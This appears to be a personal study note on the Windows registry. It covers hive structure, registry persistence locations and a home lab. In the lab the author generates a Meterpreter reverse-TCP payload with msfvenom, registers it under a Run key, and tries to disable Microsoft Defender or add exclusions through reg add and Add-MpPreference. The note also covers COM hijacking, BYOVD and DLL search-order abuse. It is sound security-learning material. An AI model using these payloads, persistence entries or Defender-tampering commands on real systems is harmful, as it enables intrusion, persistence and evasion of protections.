---
created: 2026-01-06
modified: 2026-01-06
---

 Windows registry is a hierarchical database used to store information that is necessary to configure the system for one or more users, applications and hardware devices. 

The Registry contains information that Windows continually references during operation, such as profiles for each user, the applications installed on the computer and the types of documents that each can create, property sheet settings for folders and application icons, what hardware exists on the system, and the ports that are being used.


## Structure of the registry

The registry is organized in a tree format with each node called a **`key (folder)`**. Each key can contain **`subkeys`** and **`values`**. 
Each key has a unique name and can have multiple values associated with it. The maximum depth of a registry tree can be 512 levels, and you can create up to 32 levels at a time through a single API call.

### Registry Hives

Sometimes referred to as `Root Keys`, at the top level sections of the registry. We only have 5 hive :
- HKEY_CLASSES_ROOT (HKCR)
- HKEY_CURRENT_USER (HKCU)
- HKEY_LOCAL_MACHINE (HKLM)
- HKEY_USERS (HKU)
- HKEY_CURRENT_CONFIG (HKCC)

#### HKEY_CURRENT_USER (HKCU)

Contains the root of the configuration information for the user who is currently logged on. The user's folders, screen colors, and Control Panel settings are stored here. This information is associated with the user's profile.
#### HKEY_USERS (HKU)
Contains all the actively loaded user profiles on the computer. `HKEY_CURRENT_USER` is a subkey of `HKEY_USERS.` `HKCU` is just a _pointer_ to the currently logged-in user’s SID under `HKU`. Example `HKEY_USERS\S-1-5-21-<SID>` corresponds to a specific user profile.
#### HKEY_LOCAL_MACHINE (HKLM)
Contains configuration information particular to the computer for any user (system wide setting applied to all users) ie information about the local computer system, including hardware and operating system data, such as bus type, system memory, device drivers, and startup control parameters. Backed by files in:
```
C:\Windows\System32\config\
├── SAM
├── SECURITY
├── SOFTWARE
├── SYSTEM
└── DEFAULT
```

#### HKEY_CLASSES_ROOT (HKCR)
Is a subkey of `HKEY_LOCAL_MACHINE\Software`. The information that is stored here makes sure that the correct program opens when you open a file by using Windows Explorer eg when opening a .txt file notepad.exe is opened. Starting with Windows 2000, this information is stored under both the `HKEY_LOCAL_MACHINE` and `HKEY_CURRENT_USER` keys.

The `HKEY_LOCAL_MACHINE\Software\Classes` key contains default settings that can apply to all users on the local computer. The `HKEY_CURRENT_USER\Software\Classes` key contains settings that override the default settings and apply only to the interactive user (current logged user). The `HKEY_CLASSES_ROOT` key provides a view of the registry that merges the information from these two sources. 

To change the settings for the interactive user, changes must be made under `HKEY_CURRENT_USER\Software\Classes` instead of under `HKEY_CLASSES_ROOT`. To change the default settings, changes must be made under `HKEY_LOCAL_MACHINE\Software\Classes`. 

If you write values to a key under `HKEY_CLASSES_ROOT`, the system stores the information under `HKEY_LOCAL_MACHINE\Software\Classes`. If you write values to a key under `HKEY_CLASSES_ROOT`, and the key already exists under `HKEY_CURRENT_USER\Software\Classes`, the system will store the information there instead of under `HKEY_LOCAL_MACHINE\Software\Classes`.



> [!NOTE]
> The `HKEY_CLASSES_ROOT` subtree contains two types of data:
> - Data that associates file types with programs. The file type subkeys in `HKEY_CLASSES_ROOT` have the same name as the file name extension for the file type, such as .exe. 
>  
>  - Configuration data for Component Object Model (COM )objects, Visual Basic programs, or other automation. The configuration subkeys use either the program IDs (such as for COM, Visual Basic, automation, and scripting) or parent keys for other classes of information (such as for CLSID, Interface, TypeLib, AppId, and so on).
> 
> The content of `HKEY_CLASSES_ROOT` comes from two sources: `HKEY_LOCAL_MACHINE\SOFTWARE\Classes` and `HKEY_CURRENT_USER\SOFTWARE\Classes`. If a subkey or entry appears in either location, then it also appears in `HKEY_CLASSES_ROOT`. If the values of entries in the two Classes subkeys conflict, then only the value in `HKEY_CURRENT_USER\SOFTWARE\Classes` appears in `HKEY_CLASSES_ROOT.`

#### HKEY_CURRENT_CONFIG (HKCC)
Contains information about the hardware profile that is used by the local computer at system startup/boot. This hive is **volatile** (not saved on disk).


### System-wide Hive Files
These are the persistent registry hives stored in **`%SystemRoot%\System32\Config`**: ie C:\WIndows\System32\Config 

| Hive File | Maps to Registry Key | Purpose                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| --------- | -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| SAM       | HKLM\SAM             | Stores local user & group account info handled by the Security Accounts Manager (SAM). Contains the **hashed passwords** for local accounts (encrypted by SysKey/DPAPI).<br>If an attacker gets both **SAM** + **SYSTEM**, they can extract and crack NTLM hashes.Lateral movement / pass-the-hash attacks often start from this.                                                                                                          |
| SECURITY  | HKLM\SECURITY        | Stores **Local Security Authority (LSA) secrets** (e.g., cached credentials, service account passwords, Stored VPN / RDP credentials). Controlled by the **LSASS process** at runtime.<br><br>Attackers target this hive to extract cached credentials and service passwords.<br>Together with SYSTEM, it can reveal **plaintext passwords** from LSA secrets.                                                                             |
| SYSTEM    | HKLM\SYSTEM          | System configuration, services, drivers, boot settings. Very important for startup & persistence mechanisms. Also critical because SYSTEM is needed (with SAM) to decrypt account password hashes.                                                                                                                                                                                                                                         |
| SOFTWARE  | HKLM\SOFTWARE        | Holds **system-wide software configuration**.Stores information about installed applications, system settings, COM objects, drivers, environment variables. A prime target for **persistence techniques**:<br><br>- `Run` / `RunOnce` keys → auto-execute malware on startup.<br>- **COM hijacking** → redirect legitimate COM objects to attacker’s code.<br>- App paths and shell extensions can be manipulated.  - DLL hijacking paths. |
| DEFAULT   | HKLM\.DEFAULT        | Default user profile template used at logon screen and for new accounts.                                                                                                                                                                                                                                                                                                                                                                   |
### User-specific Hive Files
Each Windows user also has their own registry hive files stored in their profile directory:

**NTUSER.DAT**  
Location: `C:\Users\<username>\NTUSER.DAT`  
Loads into: `HKEY_CURRENT_USER`  
Contains user-specific settings (desktop, Explorer preferences, environment, software configs).

**USRCLASS.DAT**  
Location: `C:\Users\<username>\AppData\Local\Microsoft\Windows\USRCLASS.DAT`
Loads into: `HKEY_CURRENT_USER\Software\Classes`  
Stores COM registrations and class information for the user. Common persistence target for attackers.

## Common Registry Attacks
### Persistence and execution
- **HKLM\SYSTEM\CurrentControlSet\Services**
    - Persistence: **Service persistence** – Attacker creates or modifies a Windows service to load their binary/DLL at boot. Runs under SYSTEM.
    - Privilege: SYSTEM
    - Risk/Stealth: Very stealthy, looks like legit service. Misconfig can crash OS.
    - Usage: Used by APTs, rootkits, and RATs for long-term persistence.
        
- **HKLM\Software\Microsoft\Windows\CurrentVersion\Run**
    - Persistence: **Startup program (machine-wide)** – Executes listed programs whenever _any user_ logs in includin malicious programs.
    - Privilege: Admin
    - Risk/Stealth: Medium stealth (commonly checked). Survives reboot.
    - Usage: Early-stage persistence for malware like trojans and worms.
    
- **HKCU\Software\Microsoft\Windows\CurrentVersion\Run**
    - Persistence: **Startup program (per-user)** – Runs only for that user at login.
    - Privilege: User
    - Risk/Stealth: Very noisy, AV/EDR scan often. Easy to abuse.
    - Usage: Droppers, adware, loaders, ransomware setup.
    
- **HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce**
    - Persistence: **One-time startup (system-wide)** – Program runs once, then key auto-deletes.
    - Privilege: Admin
    - Risk/Stealth: Less obvious than Run. Survives reboot (once).
    - Usage: Malware may use this to bootstrap into stealthier persistence.
    
- **HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce**
    - Persistence: **One-time startup (per-user)** – Same, but only for current user.
    - Privilege: User
    - Risk/Stealth: Same as above.
    - Usage: Used during initial infection (e.g., installers, droppers).
    
- **HKCU\Environment\UserInitMprLogonScript**
    - Persistence: **Logon script execution** – Attacker adds script/DLL that runs when user logs on.
    - Privilege: User
    - Risk/Stealth: Stealthier than Run keys. Executes before Explorer.
    - Usage: Malware and pentesters use this to auto-run payloads.
    
- **HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit**
    - Persistence: **Userinit hijack** – Normally runs `userinit.exe`; attackers append malicious binaries to chain execution.
    - Privilege: SYSTEM/Admin
    - Risk/Stealth: Stealthy, runs at login. Can break login if removed wrong.
    - Usage: Used for credential stealers and backdoors.
    
- **HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell**
    - Persistence: **Shell hijack** – Normally `explorer.exe`; attackers replace with custom binary that launches explorer + malware.
    - Privilege: SYSTEM/admin
    - Risk/Stealth: Very stealthy, persistent GUI. Can break if misconfigured.
    - Usage: Advanced persistence used by APT malware.
    
- **HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components**
    - Persistence: **Active Setup** – Runs command once per user on login, auto-recreates per new user.
    - Privilege: Admin
    - Risk/Stealth: Rarely checked. Good stealth.
    - Usage: Adware, spyware, and APT persistence.
    
- **HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components**
    - Persistence: Same as above, but scoped to single user.
    - Privilege: User
    - Risk/Stealth: Less stealth.
    - Usage: Commodity malware persistence.
    
- **HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run**
    - Persistence: **Run key (32-bit apps on 64-bit OS)** – Same as Run, but under WoW64 subsystem.
    - Privilege: Admin
    - Risk/Stealth: Often overlooked by defenders.
    - Usage: Malware targeting x86 compatibility on x64.
    
- **HKCU\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run**
    - Persistence: Same, but per-user.
    - Privilege: User
    - Risk/Stealth: Noisy, low stealth.
    - Usage: Cheap persistence for droppers.
    
- **HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute**
    - Persistence: **BootExecute hijack** – Normally runs `autocheck autochk *`; attackers insert payload to run before Windows services start.
    - Privilege: SYSTEM
    - Risk/Stealth: Extremely stealthy, kernel-level execution. Can break boot.
    - Usage: Bootkits and low-level persistence.
    
- **HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\SubSystems**
    - Persistence: **Subsystem modification** – Hijack Windows subsystem (e.g., `Windows`) to load attacker-controlled binaries.
    - Privilege: SYSTEM
    - Risk/Stealth: Rare, stealthy. OS instability if misused.
    - Usage: Advanced persistence, sometimes used in espionage malware.
    
- **HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run**
    - Persistence: **Explorer Policies AutoRun** – Forces apps to run when Explorer starts.
    - Privilege: Admin
    - Risk/Stealth: Rarely checked.
    - Usage: Abused for persistence in enterprise environments.
    
- **HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run**
    - Persistence: Same, but user-level only.
    - Privilege: User
    - Risk/Stealth: Low stealth.
    - Usage: Commodity malware persistence.
    
- **HKCU & HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run / Run32 / StartupFolder**
    - Persistence: **Modern startup registry (Win10+)** – Tracks and approves startup apps (tied to Task Manager “Startup” tab).
    - Privilege: Admin/User
    - Risk/Stealth: Harder to detect. Integrated in Windows startup mechanism.
    - Usage: Used by newer malware families for stealth.
    
- **HKLM\SOFTWARE\Classes\CLSID{GUID}\InprocServer32**
    - Persistence: **COM hijacking (system-wide)** – Replace DLL path of COM object so malware DLL loads when COM object is invoked.
    - Privilege: Admin
    - Risk/Stealth: Very stealthy, abused by APTs.
    - Usage: Long-term persistence & privilege escalation.
    
- **HKCU\SOFTWARE\Classes\CLSID{GUID}\InprocServer32**
    - Persistence: **COM hijacking (per-user)** – Same, but no admin rights needed.
    - Privilege: User
    - Risk/Stealth: Works without admin. Can be noisy.
    - Usage: Malware + red teams use it for stealthy persistence.
    
- **HKLM\SYSTEM\CurrentControlSet\Control\Lsa** (`Authentication Packages`)
    - Persistence: **LSASS injection via registry** – Load custom DLL into LSASS process at boot.
    - Privilege: SYSTEM
    - Risk/Stealth: Extremely stealthy, runs as SYSTEM. Dangerous if broken.
    - Usage: Credential dumpers, mimikatz-style persistence.
    
- **HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot**
    - Persistence: **SafeBoot persistence** – Modify Safe Mode service list so attacker binary loads even in Safe Mode.
    - Privilege: SYSTEM
    - Risk/Stealth: Advanced stealth.
    - Usage: Used to disable AV/EDR or maintain persistence in Safe Mode.

#### Persistence and execution Lab Exercise

first we need a payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.30 LPORT=1337 -f exe -o lab_payload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: lab_payload.exe

```

Then transfer the payload to the target machine.

![[Pasted image 20250829214703.png]]

```powershell
PS C:\Users\darklight-win\Documents> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v labReverseShell /d "C:\Users\darklight-win\Documents\lab_payload.exe" /f

The operation completed successfully.
```

you can use the command below to see the options needed when adding a value to a key

```powershell
reg add /?
```

to query the registy use the command below 

```powershell
PS C:\Users\darklight-win\Documents> reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    MicrosoftEdgeAutoLaunch_D1E093132C3F61A84120813A98333499    REG_SZ    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window --win-session
-start
    labReverseShell    REG_SZ    C:\Users\darklight-win\Documents\lab_payload.exe

PS C:\Users\darklight-win\Documents> 
```

Next step is to set up the listener to the port we used when creating our payload... today am feeling a little fancy so am going to use metasploit instead of the normal `rlwrap nc -lvnp 1337` 

![[Pasted image 20250829220955.png]]

now we restart our window host 

I got a BSOD and restarted it again and got stuck into an eternity of updates then after a successfull reboot we get no shell.. our payload has been removed from the file system by defender.. but in the registry, the value we added is still present just pointing to a non-exixtent file. 

disabled the defender and restarted again and finally got a callback to my listener.

![[Pasted image 20250829233348.png]]

### COM Hijacking

**COM hijacking** is a Windows persistence and privilege escalation technique where an attacker abuses the **Component Object Model (COM)** by modifying registry keys (typically under `HKLM` or `HKCU\Software\Classes\CLSID`) so that when a trusted process requests a COM object, Windows loads the attacker’s malicious DLL or executable instead of the legitimate one. This allows the attacker’s code to execute in the security context of the calling process (often elevated or highly trusted), enabling stealthy persistence without creating obvious autorun entries and blending malicious activity into normal system behavior.

To learn more about COM read this note [[COM and DCOM#COM]]
#### Registry Paths Involved
The main persistence vector is through the **HKLM (system-wide)** or **HKCU (per-user)** hives:

HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32 
HKLM\Software\Classes\CLSID\{CLSID}\LocalServer32 
HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32 
HKCU\Software\Classes\CLSID\{CLSID}\LocalServer32

- **InprocServer32** → Specifies the DLL to load for the COM object.
- **LocalServer32** → Specifies an EXE to execute for the COM object.

[[RustyKey#COM Hijacking]]
### Defense Evasion

To check if windows defender is active you can run the following commands.

```powershell
Get-MpComputerStatus | Select RealTimeProtectionEnabled, AntispywareEnabled, AntivirusEnabled
```

![[Pasted image 20250830083654.png]]

Since we are learning about registry we can also query registry keys.

```powershell
 reg query 'HKLM\SOFTWARE\Microsoft\Windows Defender'
```

![[Pasted image 20250830084137.png]]

DIsabling windows defender is highly protected by **`Tamper Protection`**

> [!NOTE]
> Tamper Protection is a security feature in Windows 10 and Windows 11 designed to prevent unauthorized changes to critical security settings, particularly those related to Microsoft Defender Antivirus. It blocks attempts to disable real-time protection, cloud-delivered protection, or modify core Windows Security configurations through methods like the Registry Editor, PowerShell, or Group Policy. This feature is enabled by default on most Windows 10 and Windows 11 devices with recent updates, and it helps protect against malware, malicious users, and third-party applications trying to alter security settings. 


To know if tamper option is set on query the following registry.

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" 
```

![[Pasted image 20250830085929.png]]

or 

```powershell
Get-MpComputerStatus | Select IsTamperProtected
```

we can try to disable the windows defender while the tamper protection is on and see what really happens. 


First we need to understand that... Microsoft Defender runs as a service called **WinDefend**, with features like **AntivirusEnabled** and **AntispywareEnabled** that can be disabled one at a time, but if the WinDefend service is stopped, all these features are disabled together.

![[Pasted image 20250831102313.png]]

#### Stopping WinDefend Service
And you might ask if the  service can be stopped and all the defense features are disabled, then why dont we just stop the service all together instead of trying hard to bypass the AV etc ?
Here is why you cannot do that: 

> [!NOTE]
> **WinDefend** is registered as a **Protected Service (PPL – Protected Process Light)**.
> Because of that, even if you’re **Administrator** or even **NT AUTHORITY\SYSTEM**, normal service-control calls like `Stop-Service` or `sc stop` **will always fail**.

Am currently logged to my windows vm using ssh as a normal user, lets try to stop the service and see what happens.

![[Pasted image 20250831102910.png]]

and we get the error 

> [!error]
> This script contains malicious content and has been blocked by your antivirus software.

i will get into windows and start a powershell session as an administrator and rerun the same command .
![[Pasted image 20250831103436.png]]

I get the same error. 
Finally lets get a powershell session as `System`

![[Pasted image 20250831105633.png]]
This fails because **WinDefend** is registered as a **Protected Service**.

Earlier i had mentioned something about `Tamper Protection` but so far we haven't seen how it comes to play.  For example in our earlier lap practice when we were learning persitence and execution from registries we did collide with microsoft defender specifically the `AntiVirus` feature where our payload was being deleted from the file system and we had to turn off microsoft defender for sometime.

> [!NOTE]
> The **Antivirus feature in Microsoft Defender** is the part that scans files, processes, and memory for malicious code (viruses, worms, Trojans, etc.) and takes action like quarantine or removal if a threat is found.

Now in this case as a threat actor, you know very well you cannot stop **WinDefend** service, So what is the work arround for this ? Disabling Microsoft Defender features in this case `Antivirus`.
#### Disabling the Antivirus
| Registry Path                                            | Source                                                | Exists When                             | Priority            | Purpose / Notes                                                                                                                                          |
| -------------------------------------------------------- | ----------------------------------------------------- | --------------------------------------- | ------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **HKLM\SOFTWARE\Microsoft\Windows Defender\\***          | Local system settings (default + user/system changes) | Always present if Defender is installed | **Lower priority**  | Reflects current Defender configuration (set via UI, PowerShell, registry edits). Changes here apply only if no Group Policy overrides exist.            |
| **HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\\*** | Group Policy / Intune / Enterprise policy             | Only present if policies are configured | **Higher priority** | Holds enforced policy settings. Anything defined here **overrides** the corresponding value in the normal path. Used in managed/enterprise environments. |
  
Looking at the image below showing the "settings" of microsoft defender we see that the value `DisableAntivirus` is set to  `0x0` which is zero but in binary which basically means false.. 

![[Pasted image 20250831112128.png]]

What if we set the value to 1 which will mean true (ie antivirus is disabled) ?

```powershell
reg add 'HKLM\SOFTWARE\Microsoft\Windows Defender' /v DisableAntiVirus /d 1 /t REG_DWORD /f
```

![[Pasted image 20250831113040.png]]

We get access denied even if you try to elevate you privilges to administrator or nt authority\system you will get the same error and why so ? Its because `Tamper Proctection` is enabled. 
Same applies to all other features `RealtimeProtection, AntiSpyware etc`

#### Disabling Tamper Protection

Now the question is, can we disable `Tamper Protection` ? You can also ask yourself if we can disable `Tamper Protection` from CLI then waht is the need of protection microsoft defender with tamper Protection ? I think you got the answer to the first question.

When tamper protection is turned on, these tamper-protected settings can't be changed:

- Virus and threat protection remains enabled.
- Real-time protection remains turned on.
- Behavior monitoring remains turned on.
- Antivirus protection, including IOfficeAntivirus (IOAV) remains enabled.
- Cloud protection remains enabled.
- Security intelligence updates occur.
- Automatic actions are taken on detected threats.
- Notifications are visible in the Windows Security app on Windows devices.
- Archived files are scanned.
- [Exclusions can't be modified or added](https://learn.microsoft.com/en-us/defender-endpoint/manage-tamper-protection-intune#tamper-protection-for-antivirus-exclusions) (Applies to devices managed by Intune only or by Configuration Manager only. Co-Managed devices aren't supported)

**TPExclusion** - Refers to _Tamper Protection exclusions_. It controls whether **Tamper Protection itself** has carve-outs (i.e., whether some settings can be modified even though Tamper Protection is on). Default value is `0x0` (no exclusions).

**TamperProtectionSource** - This registry value tells you **where Tamper Protection was configured from** (who/what enforces it). maybe the user, GPO

| Hex Value | Decimal | Meaning                                                                  |
| --------- | ------- | ------------------------------------------------------------------------ |
| `0x0`     | 0       | Not set (no source defined).                                             |
| `0x1`     | 1       | Set by **policy** (e.g., Intune, Group Policy, MDM).                     |
| `0x2`     | 2       | Set by **user/system default** (enabled by user manually or by default). |

>[!NOTE]
>When tamper protection is turned on, tamper-protected settings can't be changed. To avoid breaking management experiences, including [Intune](https://learn.microsoft.com/en-us/defender-endpoint/manage-tamper-protection-intune) and [Configuration Manager](https://learn.microsoft.com/en-us/defender-endpoint/manage-tamper-protection-configuration-manager), keep in mind that changes made to tamper-protected settings might appear to succeed but are actually blocked by tamper protection. Usually the case when you use `Set-MpPreference` but using `reg add` you will get a feedback of `Acces Denied` most of the time.
>


Lets query Microsoft Defender features to determine is Tamper Protection is enabled

```powershell
 reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Features"
```

![[Pasted image 20250831120843.png]]

Under `TamperProtection` the first value listed in the query, it is set to `0x5`.. 

| **Hex Value** | **Decimal Value** | **Meaning**                                                                         |
| ------------- | ----------------- | ----------------------------------------------------------------------------------- |
| **0x0**       | 0                 | Tamper Protection **disabled**                                                      |
| **0x1**       | 1                 | Enabled via **policy/enterprise management** (Intune, Group Policy, etc.)           |
| **0x2**       | 2                 | Enabled by **user or system default** (local setting)                               |
| **0x5**       | 5                 | **Fully enabled + system enforced** (default; blocks registry/PowerShell tampering) |

Try to disable Tamper Protection we get `Access denied`

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /d 0 /t REG_DWORD /f
```

![[Pasted image 20250831122437.png]]

Also with all other elevated privileges i got access denied. 

You ca also use `Set-MpPreference` to modify defender features etc

eg to diabled realtime-protection

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Defense Evasion via Windows Defender Exclusions

In windows settings under Windows security you will find this 

![[Pasted image 20250831123627.png]]

Windows Defender Antivirus (MDAV) allows administrators to create exclusions to bypass real-time scanning for specific processes, file paths, file extensions, or IP addresses, which can be useful for legitimate software but is also a common tactic exploited by adversaries to evade detection. These exclusions are managed through several methods, including PowerShell commands like `Add-MpPreference` or `Set-MpPreference`, the Windows Management Instrumentation (WMI) class `MSFT_MpPreference`, Group Policy Objects (GPO), and direct registry modifications.

Exclusion types include:

- **Process:** Disables real-time scanning on files opened by a specific process.
- **Path:** Excludes entire file paths from real-time, scheduled, and on-demand scans.
- **Extension:** Disables scanning for specific file extensions.
- **IpAddress:** Disables network packet inspection from a specific IP address.


|Registry Path|Source|Exists When|Priority|Notes|
|---|---|---|---|---|
|**HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions**|**Policy-based** (Group Policy, Intune, enterprise management)|Only if exclusions are enforced by domain policy|**Higher priority** (overrides local)|Used in corporate/managed environments|
|**HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions**|**Local config** (Windows Security UI, PowerShell `Add-MpPreference`)|Always on standalone systems if exclusions are set|Lower priority|User/admin-defined exclusions, can be overwritten by policy|
To query exclusion 

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions"
```
Below are the locations for our exclusions..  

![[Pasted image 20250831125430.png]]

Sample commands 

```powershell
# Exclude a folder
Add-MpPreference -ExclusionPath "C:\MalwareLab"

# Exclude a file
Add-MpPreference -ExclusionProcess "C:\Tools\mytool.exe"

# Exclude a process by name
Add-MpPreference -ExclusionProcess "notepad.exe"

# Exclude a file extension
Add-MpPreference -ExclusionExtension ".txt"
```

In this exercise we will play with the path exclusion. We can proceed and query the paths exculison key
 
And current i have no path in the exclusions
 
![[Pasted image 20250831131433.png]]

![[Pasted image 20250831133034.png]]

Adding a value to the excluion path key using `reg.exe` fails with `Access Denied` but `Add-MpPreference -ExclusionPath` works fine as a normal user  because **Tamper Protection blocks raw registry edits** (`reg add`).

> [!important]
> DAMNNN!! almost gave a misinformation there ... **Windows Defender** stores its **system-wide configuration** under `HKLM\SOFTWARE\Microsoft\Windows Defender`, which includes critical settings such as _real-time protection_ and _exclusions_. Because these settings affect the entire system, **administrative privileges** are required to modify them.
> 
Although there is also a user-specific key , `HKCU\SOFTWARE\Microsoft\Windows Defender` ,  standard users can modify it only for their own accounts. However, Windows Defender generally **ignores user-level registry entries** for core protection features, relying solely on the system-level `(HKLM)` configuration to ensure consistent and tamper-resistant security across all user profiles. As a result, any exclusions or changes made under `HKCU\SOFTWARE\Microsoft\Windows Defender\Exclusions` are **ignored by Windows Defender**, rendering such modifications ineffective.
> 

Now we can redo the [[Windows Registry#Persistence and execution Lab Exercise]] without having to disable Defender. 

The payload is not removed from the file system after a successful restart which means the exclusion does work as expected but our entry in the registry at `HKCU\Software\Microsoft\Windows\CuurentVersion\RUn` is being  removed possibly because of `Realtime-Protection` and we cannot turn it off because of `tamper protection` 😖😖

#### BYOVD

Most modern Windows PCs rely on [Microsoft](https://www.foxnews.com/category/tech/companies/microsoft) Defender as their first line of defense against malware. Over the years, it has evolved into a capable and often underrated antivirus that blocks a wide range of threats. But a hacker group has found a way to abuse a legitimate Intel CPU tuning driver in a "Bring Your Own Vulnerable Driver" (BYOVD) attack to completely disable Microsoft Defender.

The Akira ransomware group has developed a new way to bypass security tools by using a legitimate [Intel](https://www.foxnews.com/category/tech/companies/intel) CPU tuning driver called rwdrv.sys from the performance-tweaking tool ThrottleStop. Security firm GuidePoint Security says attackers load this driver to gain kernel-level access to Windows systems, then install a second malicious driver, hlpdrv.sys, which changes the DisableAntiSpyware registry setting via regedit.exe to shut down Microsoft Defender.

Once Defender is disabled, attackers can run other malicious programs undetected.

reference: https://www.foxnews.com/tech/hackers-found-way-turn-off-windows-defender-remotely
#### SafeDllSearchMode (DLL hijacking)
Path: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager`
Normally `1` (safe mode).
 If set to `0`, Windows will _prioritize the current working directory_ when searching for DLLs an attacker can plant a malicious DLL there and it gets loaded first.



AMSI Bypasses

